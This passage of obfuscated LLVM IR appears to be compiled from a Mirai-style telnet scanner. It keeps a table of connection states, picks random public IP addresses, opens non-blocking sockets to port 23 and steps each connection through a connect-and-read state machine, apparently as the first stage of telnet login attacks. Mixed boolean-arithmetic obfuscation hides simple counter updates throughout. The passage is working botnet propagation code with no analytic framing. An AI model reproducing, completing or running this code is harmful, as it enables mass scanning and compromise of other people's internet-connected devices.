  %20 = icmp sgt i32 %19, 4096
  br i1 %20, label %21, label %22

; <label>:21:                                     ; preds = %1
  br label %24

; <label>:22:                                     ; preds = %1
  %23 = load i32, i32* %3, align 4
  br label %24

; <label>:24:                                     ; preds = %22, %21
  %25 = phi i32 [ 4096, %21 ], [ %23, %22 ]
  store i32 %25, i32* %3, align 4
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %26, align 4
  %27 = call zeroext i16 @htons(i16 zeroext 23) #13
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %27, i16* %28, align 2
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %30 = getelementptr inbounds [8 x i8], [8 x i8]* %29, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %30, i8 0, i64 8, i32 4, i1 false)
  %31 = load i32, i32* %3, align 4
  %32 = zext i32 %31 to i64
  %33 = call i8* @llvm.stacksave()
  store i8* %33, i8** %11, align 8
  %34 = alloca %struct.telstate_t, i64 %32, align 16
  %35 = bitcast %struct.telstate_t* %34 to i8*
  %36 = load i32, i32* %3, align 4
  %37 = sext i32 %36 to i64
  %38 = mul i64 %37, 5
  call void @llvm.memset.p0i8.i64(i8* %35, i8 0, i64 %38, i32 16, i1 false)
  store i32 0, i32* %4, align 4
  br label %39

; <label>:39:                                     ; preds = %58, %24
  %40 = load i32, i32* %4, align 4
  %41 = load i32, i32* %3, align 4
  %42 = icmp slt i32 %40, %41
  br i1 %42, label %43, label %64

; <label>:43:                                     ; preds = %39
  %44 = load i32, i32* %4, align 4
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %45
  %47 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i32 0, i32 3
  store i8 1, i8* %47, align 1
  %48 = call noalias i8* @malloc(i64 1024) #2
  %49 = load i32, i32* %4, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %50
  %52 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i32 0, i32 8
  store i8* %48, i8** %52, align 8
  %53 = load i32, i32* %4, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %54
  %56 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %55, i32 0, i32 8
  %57 = load i8*, i8** %56, align 8
  call void @llvm.memset.p0i8.i64(i8* %57, i8 0, i64 1024, i32 1, i1 false)
  br label %58

; <label>:58:                                     ; preds = %43
  %59 = load i32, i32* %4, align 4
  %60 = add i32 %59, -1828139573
  %61 = add i32 %60, 1
  %62 = sub i32 %61, -1828139573
  %63 = add nsw i32 %59, 1
  store i32 %62, i32* %4, align 4
  br label %39

; <label>:64:                                     ; preds = %39
  %65 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 5, i64* %65, align 8
  %66 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %66, align 8
  br label %67

; <label>:67:                                     ; preds = %1230, %64
  br label %68

; <label>:68:                                     ; preds = %67
  store i32 0, i32* %4, align 4
  br label %69

; <label>:69:                                     ; preds = %1223, %68
  %70 = load i32, i32* %4, align 4
  %71 = load i32, i32* %3, align 4
  %72 = icmp slt i32 %70, %71
  br i1 %72, label %73, label %1230

; <label>:73:                                     ; preds = %69
  %74 = load i32, i32* %4, align 4
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %75
  %77 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %76, i32 0, i32 2
  %78 = load i8, i8* %77, align 8
  %79 = zext i8 %78 to i32
  switch i32 %79, label %1222 [
    i32 0, label %80
    i32 1, label %246
    i32 2, label %429
    i32 3, label %519
    i32 4, label %587
    i32 5, label %715
    i32 6, label %783
    i32 7, label %929
    i32 8, label %957
    i32 9, label %985
    i32 10, label %1013
    i32 11, label %1041
  ]

; <label>:80:                                     ; preds = %73
  %81 = load i32, i32* %4, align 4
  %82 = sext i32 %81 to i64
  %83 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %82
  %84 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %83, i32 0, i32 8
  %85 = load i8*, i8** %84, align 8
  call void @llvm.memset.p0i8.i64(i8* %85, i8 0, i64 1024, i32 1, i1 false)
  %86 = load i32, i32* %4, align 4
  %87 = sext i32 %86 to i64
  %88 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %87
  %89 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %88, i32 0, i32 3
  %90 = load i8, i8* %89, align 1
  %91 = icmp ne i8 %90, 0
  br i1 %91, label %92, label %112

; <label>:92:                                     ; preds = %80
  %93 = load i32, i32* %4, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %94
  %96 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %95, i32 0, i32 8
  %97 = load i8*, i8** %96, align 8
  store i8* %97, i8** %13, align 8
  %98 = load i32, i32* %4, align 4
  %99 = sext i32 %98 to i64
  %100 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %99
  %101 = bitcast %struct.telstate_t* %100 to i8*
  call void @llvm.memset.p0i8.i64(i8* %101, i8 0, i64 32, i32 16, i1 false)
  %102 = load i8*, i8** %13, align 8
  %103 = load i32, i32* %4, align 4
  %104 = sext i32 %103 to i64
  %105 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %104
  %106 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %105, i32 0, i32 8
  store i8* %102, i8** %106, align 8
  %107 = call i32 @getRandomPublicIP()
  %108 = load i32, i32* %4, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %109
  %111 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %110, i32 0, i32 1
  store i32 %107, i32* %111, align 4
  br label %157

; <label>:112:                                    ; preds = %80
  %113 = load i32, i32* %4, align 4
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %114
  %116 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %115, i32 0, i32 5
  %117 = load i8, i8* %116, align 1
  %118 = add i8 %117, 0
  %119 = add i8 %118, 1
  %120 = sub i8 %119, 0
  %121 = add i8 %117, 1
  store i8 %120, i8* %116, align 1
  %122 = load i32, i32* %4, align 4
  %123 = sext i32 %122 to i64
  %124 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %123
  %125 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %124, i32 0, i32 5
  %126 = load i8, i8* %125, align 1
  %127 = zext i8 %126 to i64
  %128 = icmp eq i64 %127, 14
  br i1 %128, label %129, label %143

; <label>:129:                                    ; preds = %112
  %130 = load i32, i32* %4, align 4
  %131 = sext i32 %130 to i64
  %132 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %131
  %133 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %132, i32 0, i32 5
  store i8 0, i8* %133, align 1
  %134 = load i32, i32* %4, align 4
  %135 = sext i32 %134 to i64
  %136 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %135
  %137 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %136, i32 0, i32 4
  %138 = load i8, i8* %137, align 2
  %139 = add i8 %138, -74
  %140 = add i8 %139, 1
  %141 = sub i8 %140, -74
  %142 = add i8 %138, 1
  store i8 %141, i8* %137, align 2
  br label %143

; <label>:143:                                    ; preds = %129, %112
  %144 = load i32, i32* %4, align 4
  %145 = sext i32 %144 to i64
  %146 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %145
  %147 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %146, i32 0, i32 4
  %148 = load i8, i8* %147, align 2
  %149 = zext i8 %148 to i64
  %150 = icmp eq i64 %149, 6
  br i1 %150, label %151, label %156

; <label>:151:                                    ; preds = %143
  %152 = load i32, i32* %4, align 4
  %153 = sext i32 %152 to i64
  %154 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %153
  %155 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %154, i32 0, i32 3
  store i8 1, i8* %155, align 1
  br label %1223

; <label>:156:                                    ; preds = %143
  br label %157

; <label>:157:                                    ; preds = %156, %92
  %158 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %158, align 4
  %159 = call zeroext i16 @htons(i16 zeroext 23) #13
  %160 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %159, i16* %160, align 2
  %161 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %162 = getelementptr inbounds [8 x i8], [8 x i8]* %161, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %162, i8 0, i64 8, i32 4, i1 false)
  %163 = load i32, i32* %4, align 4
  %164 = sext i32 %163 to i64
  %165 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %164
  %166 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %165, i32 0, i32 1
  %167 = load i32, i32* %166, align 4
  %168 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %169 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %168, i32 0, i32 0
  store i32 %167, i32* %169, align 4
  %170 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %171 = load i32, i32* %4, align 4
  %172 = sext i32 %171 to i64
  %173 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %172
  %174 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %173, i32 0, i32 0
  store i32 %170, i32* %174, align 16
  %175 = load i32, i32* %4, align 4
  %176 = sext i32 %175 to i64
  %177 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %176
  %178 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %177, i32 0, i32 0
  %179 = load i32, i32* %178, align 16
  %180 = bitcast %struct.timeval* %12 to i8*
  %181 = call i32 @setsockopt(i32 %179, i32 1, i32 20, i8* %180, i32 16) #2
  %182 = load i32, i32* %4, align 4
  %183 = sext i32 %182 to i64
  %184 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %183
  %185 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %184, i32 0, i32 0
  %186 = load i32, i32* %185, align 16
  %187 = bitcast %struct.timeval* %12 to i8*
  %188 = call i32 @setsockopt(i32 %186, i32 1, i32 21, i8* %187, i32 16) #2
  %189 = load i32, i32* %4, align 4
  %190 = sext i32 %189 to i64
  %191 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %190
  %192 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %191, i32 0, i32 0
  %193 = load i32, i32* %192, align 16
  %194 = icmp eq i32 %193, -1
  br i1 %194, label %195, label %196

; <label>:195:                                    ; preds = %157
  br label %1223

; <label>:196:                                    ; preds = %157
  %197 = load i32, i32* %4, align 4
  %198 = sext i32 %197 to i64
  %199 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %198
  %200 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %199, i32 0, i32 0
  %201 = load i32, i32* %200, align 16
  %202 = load i32, i32* %4, align 4
  %203 = sext i32 %202 to i64
  %204 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %203
  %205 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %204, i32 0, i32 0
  %206 = load i32, i32* %205, align 16
  %207 = call i32 (i32, i32, ...) @fcntl(i32 %206, i32 3, i8* null)
  %208 = and i32 %207, 2048
  %209 = xor i32 %207, 2048
  %210 = or i32 %208, %209
  %211 = or i32 %207, 2048
  %212 = call i32 (i32, i32, ...) @fcntl(i32 %201, i32 4, i32 %210)
  %213 = load i32, i32* %4, align 4
  %214 = sext i32 %213 to i64
  %215 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %214
  %216 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %215, i32 0, i32 0
  %217 = load i32, i32* %216, align 16
  %218 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %219 = call i32 @connect(i32 %217, %struct.sockaddr* %218, i32 16)
  %220 = icmp eq i32 %219, -1
  br i1 %220, label %221, label %236

; <label>:221:                                    ; preds = %196
  %222 = call i32* @__errno_location() #13
  %223 = load i32, i32* %222, align 4
  %224 = icmp ne i32 %223, 115
  br i1 %224, label %225, label %236

; <label>:225:                                    ; preds = %221
  %226 = load i32, i32* %4, align 4
  %227 = sext i32 %226 to i64
  %228 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %227
  %229 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %228, i32 0, i32 0
  %230 = load i32, i32* %229, align 16
  %231 = call i32 @sclose(i32 %230)
  %232 = load i32, i32* %4, align 4
  %233 = sext i32 %232 to i64
  %234 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %233
  %235 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %234, i32 0, i32 3
  store i8 1, i8* %235, align 1
  br label %245

; <label>:236:                                    ; preds = %221, %196
  %237 = load i32, i32* %4, align 4
  %238 = sext i32 %237 to i64
  %239 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %238
  %240 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %239, i32 0, i32 2
  store i8 1, i8* %240, align 8
  %241 = load i32, i32* %4, align 4
  %242 = sext i32 %241 to i64
  %243 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %242
  %244 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %243, i32 0, i32 6
  store i32 0, i32* %244, align 4
  br label %245

; <label>:245:                                    ; preds = %236, %225
  br label %1222

; <label>:246:                                    ; preds = %73
  %247 = load i32, i32* %4, align 4
  %248 = sext i32 %247 to i64
  %249 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %248
  %250 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %249, i32 0, i32 6
  %251 = load i32, i32* %250, align 4
  %252 = icmp eq i32 %251, 0
  br i1 %252, label %253, label %259

; <label>:253:                                    ; preds = %246
  %254 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %255 = load i32, i32* %4, align 4
  %256 = sext i32 %255 to i64
  %257 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %256
  %258 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %257, i32 0, i32 6
  store i32 %254, i32* %258, align 4
  br label %259

; <label>:259:                                    ; preds = %253, %246
  br label %260

; <label>:260:                                    ; preds = %259
  %261 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %6, i32 0, i32 0
  %262 = getelementptr inbounds [16 x i64], [16 x i64]* %261, i64 0, i64 0
  %263 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %262) #2, !srcloc !5
  %264 = extractvalue { i64, i64* } %263, 0
  %265 = extractvalue { i64, i64* } %263, 1
  %266 = trunc i64 %264 to i32
  store i32 %266, i32* %14, align 4
  %267 = ptrtoint i64* %265 to i64
  %268 = trunc i64 %267 to i32
  store i32 %268, i32* %15, align 4
  br label %269

; <label>:269:                                    ; preds = %260
  br label %270

; <label>:270:                                    ; preds = %269
  %271 = load i32, i32* %4, align 4
  %272 = sext i32 %271 to i64
  %273 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %272
  %274 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %273, i32 0, i32 0
  %275 = load i32, i32* %274, align 16
  %276 = srem i32 %275, 64
  %277 = zext i32 %276 to i64
  %278 = shl i64 1, %277
  %279 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %6, i32 0, i32 0
  %280 = load i32, i32* %4, align 4
  %281 = sext i32 %280 to i64
  %282 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %281
  %283 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %282, i32 0, i32 0
  %284 = load i32, i32* %283, align 16
  %285 = sdiv i32 %284, 64
  %286 = sext i32 %285 to i64
  %287 = getelementptr inbounds [16 x i64], [16 x i64]* %279, i64 0, i64 %286
  %288 = load i64, i64* %287, align 8
  %289 = xor i64 %288, -1
  %290 = xor i64 %278, -1
  %291 = xor i64 -5432973941384072136, -1
  %292 = and i64 %289, -5432973941384072136
  %293 = and i64 %288, %291
  %294 = and i64 %290, -5432973941384072136
  %295 = and i64 %278, %291
  %296 = or i64 %292, %293
  %297 = or i64 %294, %295
  %298 = xor i64 %296, %297
  %299 = or i64 %289, %290
  %300 = xor i64 %299, -1
  %301 = or i64 -5432973941384072136, %291
  %302 = and i64 %300, %301
  %303 = or i64 %298, %302
  %304 = or i64 %288, %278
  store i64 %303, i64* %287, align 8
  %305 = getelementptr inbounds %struct.timeval, %struct.timeval* %7, i32 0, i32 0
  store i64 0, i64* %305, align 8
  %306 = getelementptr inbounds %struct.timeval, %struct.timeval* %7, i32 0, i32 1
  store i64 10000, i64* %306, align 8
  %307 = load i32, i32* %4, align 4
  %308 = sext i32 %307 to i64
  %309 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %308
  %310 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %309, i32 0, i32 0
  %311 = load i32, i32* %310, align 16
  %312 = sub i32 0, 1
  %313 = sub i32 %311, %312
  %314 = add nsw i32 %311, 1
  %315 = call i32 @select(i32 %313, %struct.__sigset_t* null, %struct.__sigset_t* %6, %struct.__sigset_t* null, %struct.timeval* %7)
  store i32 %315, i32* %5, align 4
  %316 = load i32, i32* %5, align 4
  %317 = icmp eq i32 %316, 1
  br i1 %317, label %318, label %382

; <label>:318:                                    ; preds = %270
  store i32 4, i32* %8, align 4
  store i32 0, i32* %9, align 4
  %319 = load i32, i32* %4, align 4
  %320 = sext i32 %319 to i64
  %321 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %320
  %322 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %321, i32 0, i32 0
  %323 = load i32, i32* %322, align 16
  %324 = bitcast i32* %9 to i8*
  %325 = call i32 @getsockopt(i32 %323, i32 1, i32 4, i8* %324, i32* %8) #2
  %326 = load i32, i32* %9, align 4
  %327 = icmp ne i32 %326, 0
  br i1 %327, label %328, label %343

; <label>:328:                                    ; preds = %318
  %329 = load i32, i32* %4, align 4
  %330 = sext i32 %329 to i64
  %331 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %330
  %332 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %331, i32 0, i32 0
  %333 = load i32, i32* %332, align 16
  %334 = call i32 @sclose(i32 %333)
  %335 = load i32, i32* %4, align 4
  %336 = sext i32 %335 to i64
  %337 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %336
  %338 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %337, i32 0, i32 2
  store i8 0, i8* %338, align 8
  %339 = load i32, i32* %4, align 4
  %340 = sext i32 %339 to i64
  %341 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %340
  %342 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %341, i32 0, i32 3
  store i8 1, i8* %342, align 1
  br label %381

; <label>:343:                                    ; preds = %318
  %344 = load i32, i32* %4, align 4
  %345 = sext i32 %344 to i64
  %346 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %345
  %347 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %346, i32 0, i32 0
  %348 = load i32, i32* %347, align 16
  %349 = load i32, i32* %4, align 4
  %350 = sext i32 %349 to i64
  %351 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %350
  %352 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %351, i32 0, i32 0
  %353 = load i32, i32* %352, align 16
  %354 = call i32 (i32, i32, ...) @fcntl(i32 %353, i32 3, i8* null)
  %355 = xor i32 %354, -1
  %356 = xor i32 -2049, -1
  %357 = xor i32 918478084, -1
  %358 = or i32 %355, %356
  %359 = or i32 918478084, %357
  %360 = xor i32 %358, -1
  %361 = and i32 %360, %359
  %362 = and i32 %354, -2049
  %363 = call i32 (i32, i32, ...) @fcntl(i32 %348, i32 4, i32 %361)
  %364 = load i32, i32* %4, align 4
  %365 = sext i32 %364 to i64
  %366 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %365
  %367 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %366, i32 0, i32 6
  store i32 0, i32* %367, align 4
  %368 = load i32, i32* %4, align 4
  %369 = sext i32 %368 to i64
  %370 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %369
  %371 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %370, i32 0, i32 7
  store i16 0, i16* %371, align 16
  %372 = load i32, i32* %4, align 4
  %373 = sext i32 %372 to i64
  %374 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %373
  %375 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %374, i32 0, i32 8
  %376 = load i8*, i8** %375, align 8
  call void @llvm.memset.p0i8.i64(i8* %376, i8 0, i64 1024, i32 1, i1 false)
  %377 = load i32, i32* %4, align 4
  %378 = sext i32 %377 to i64
  %379 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %378
  %380 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %379, i32 0, i32 2
  store i8 2, i8* %380, align 8
  br label %1223

; <label>:381:                                    ; preds = %328
  br label %401

; <label>:382:                                    ; preds = %270
  %383 = load i32, i32* %5, align 4
  %384 = icmp eq i32 %383, -1
  br i1 %384, label %385, label %400

; <label>:385:                                    ; preds = %382
  %386 = load i32, i32* %4, align 4
  %387 = sext i32 %386 to i64
  %388 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %387
  %389 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %388, i32 0, i32 0
  %390 = load i32, i32* %389, align 16
  %391 = call i32 @sclose(i32 %390)
  %392 = load i32, i32* %4, align 4
  %393 = sext i32 %392 to i64
  %394 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %393
  %395 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %394, i32 0, i32 2
  store i8 0, i8* %395, align 8
  %396 = load i32, i32* %4, align 4
  %397 = sext i32 %396 to i64
  %398 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %397
  %399 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %398, i32 0, i32 3
  store i8 1, i8* %399, align 1
  br label %400

; <label>:400:                                    ; preds = %385, %382
  br label %401

; <label>:401:                                    ; preds = %400, %381
  %402 = load i32, i32* %4, align 4
  %403 = sext i32 %402 to i64
  %404 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %403
  %405 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %404, i32 0, i32 6
  %406 = load i32, i32* %405, align 4
  %407 = sub i32 %406, 2055894013
  %408 = add i32 %407, 5
  %409 = add i32 %408, 2055894013
  %410 = add i32 %406, 5
  %411 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %412 = icmp ult i32 %409, %411
  br i1 %412, label %413, label %428

; <label>:413:                                    ; preds = %401
  %414 = load i32, i32* %4, align 4
  %415 = sext i32 %414 to i64
  %416 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %415
  %417 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %416, i32 0, i32 0
  %418 = load i32, i32* %417, align 16
  %419 = call i32 @sclose(i32 %418)
  %420 = load i32, i32* %4, align 4
  %421 = sext i32 %420 to i64
  %422 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %421
  %423 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %422, i32 0, i32 2
  store i8 0, i8* %423, align 8
  %424 = load i32, i32* %4, align 4
  %425 = sext i32 %424 to i64
  %426 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %425
  %427 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %426, i32 0, i32 3
  store i8 1, i8* %427, align 1
  br label %428

; <label>:428:                                    ; preds = %413, %401
  br label %1222

; <label>:429:                                    ; preds = %73
  %430 = load i32, i32* %4, align 4
  %431 = sext i32 %430 to i64
  %432 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %431
  %433 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %432, i32 0, i32 6
  %434 = load i32, i32* %433, align 4
  %435 = icmp eq i32 %434, 0
  br i1 %435, label %436, label %442

; <label>:436:                                    ; preds = %429
  %437 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %438 = load i32, i32* %4, align 4
  %439 = sext i32 %438 to i64
  %440 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %439
  %441 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %440, i32 0, i32 6
  store i32 %437, i32* %441, align 4
  br label %442

; <label>:442:                                    ; preds = %436, %429
  %443 = load i32, i32* %4, align 4
  %444 = sext i32 %443 to i64
  %445 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %444
  %446 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %445, i32 0, i32 0
  %447 = load i32, i32* %446, align 16
  %448 = load i32, i32* %4, align 4
  %449 = sext i32 %448 to i64
  %450 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %449
  %451 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %450, i32 0, i32 8
  %452 = load i8*, i8** %451, align 8
  %453 = load i32, i32* %4, align 4
  %454 = sext i32 %453 to i64
  %455 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %454
  %456 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %455, i32 0, i32 7
  %457 = load i16, i16* %456, align 16
  %458 = zext i16 %457 to i32
  %459 = call i32 @readUntil(i32 %447, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.25, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %452, i32 1024, i32 %458)
  %460 = icmp ne i32 %459, 0
  br i1 %460, label %461, label %479

; <label>:461:                                    ; preds = %442
  %462 = load i32, i32* %4, align 4
  %463 = sext i32 %462 to i64
  %464 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %463
  %465 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %464, i32 0, i32 6
  store i32 0, i32* %465, align 4
  %466 = load i32, i32* %4, align 4
  %467 = sext i32 %466 to i64
  %468 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %467
  %469 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %468, i32 0, i32 7
  store i16 0, i16* %469, align 16
  %470 = load i32, i32* %4, align 4
  %471 = sext i32 %470 to i64
  %472 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %471
  %473 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %472, i32 0, i32 8
  %474 = load i8*, i8** %473, align 8
  call void @llvm.memset.p0i8.i64(i8* %474, i8 0, i64 1024, i32 1, i1 false)
  %475 = load i32, i32* %4, align 4
  %476 = sext i32 %475 to i64
  %477 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %476
  %478 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %477, i32 0, i32 2
  store i8 3, i8* %478, align 8
  br label %1223

; <label>:479:                                    ; preds = %442
  %480 = load i32, i32* %4, align 4
  %481 = sext i32 %480 to i64
  %482 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %481
  %483 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %482, i32 0, i32 8
  %484 = load i8*, i8** %483, align 8
  %485 = call i64 @strlen(i8* %484) #10
  %486 = trunc i64 %485 to i16
  %487 = load i32, i32* %4, align 4
  %488 = sext i32 %487 to i64
  %489 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %488
  %490 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %489, i32 0, i32 7
  store i16 %486, i16* %490, align 16
  br label %491

; <label>:491:                                    ; preds = %479
  %492 = load i32, i32* %4, align 4
  %493 = sext i32 %492 to i64
  %494 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %493
  %495 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %494, i32 0, i32 6
  %496 = load i32, i32* %495, align 4
  %497 = sub i32 %496, 974799797
  %498 = add i32 %497, 30
  %499 = add i32 %498, 974799797
  %500 = add i32 %496, 30
